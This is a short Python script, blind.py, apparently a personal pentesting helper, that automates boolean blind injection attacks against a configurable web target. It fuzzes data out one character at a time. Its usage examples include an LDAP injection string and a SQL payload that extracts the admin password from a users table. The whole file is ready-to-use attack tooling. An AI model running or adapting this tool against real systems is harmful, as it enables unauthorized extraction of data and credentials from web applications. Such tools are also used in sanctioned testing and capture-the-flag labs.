#
#   Blind.
#   @Iceish
#

import requests,argparse,string
from termcolor import colored

###
### EDIT FOLLOWING VALUES ACCORDING TO YOUR TARGET.
###
BASE_URL="http://10.10.10.10?search="
SUCCESS_CONDITITON_STR="1 results"
FUZZ_DICT = string.ascii_letters+string.digits


### EDIT FUNCTION BELLOW TO SWITCH TO POST REQUESTS
def injectCondition(payload):
    res = requests.get(
            BASE_URL+payload,
    )
    # res = requests.post(
    #         BASE_URL,
    #         data=payload,
    #         headers={'Content-Type': 'application/x-www-form-urlencoded'}
    # )
    hasSucceeded = SUCCESS_CONDITITON_STR in res.text
    echo(f'{res.status_code} {payload} => {hasSucceeded}', 'light_yellow', isDebugText=True)
    return hasSucceeded

def fuzzCondition(payload):
    res = ""
    while True:
        for letter in FUZZ_DICT:
            s = res+letter
            if injectCondition(payload.format(FUZZ=s)):
                res+=letter
                echo(res, 'light_grey')
                break
        else:
            break
    return res

def main():
    args = parse_args()

    if("fuzz" in args.action):
        echo("Fuzz result => " + fuzzCondition(args.payload), 'green')
        exit(0)

    if("inject" in args.action):
        echo("Injection result => " + str(injectCondition(args.payload)), 'green')
        exit(0)

def parse_args():
    global DEBUG_MODE
    parser = argparse.ArgumentParser(
        prog='blind.py',
        description='Help to exploit blind injections (SQL, LDAP and more).', 
        epilog=
        """
examples:
    python %(prog)s inject "admin)(&)"
    python %(prog)s fuzz "AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='{FUZZ}"
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
        )
    parser.add_argument('action', type=str, choices=['inject', 'fuzz'], help='Action method to inject')
    parser.add_argument('payload', type=str, help='Payload to inject in the request')
    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug mode')

    args = parser.parse_args()
    DEBUG_MODE = args.debug

    return args

def echo(text, color='white', isDebugText=False):
    if not isDebugText or DEBUG_MODE : print(colored(text, color))

def banner():
    echo(
    """
    , __  _                   
   /|/  \| | o             |  
    | __/| |     _  _    __|  
    |   \|/  |  / |/ |  /  |  
    |(__/|__/|_/  |  |_/\_/|_/*

    Stupid helper for boolean blind injections. @Iceish                         
    """
        ,
        'light_grey'
    )

if __name__ == "__main__":
    banner()
    main()
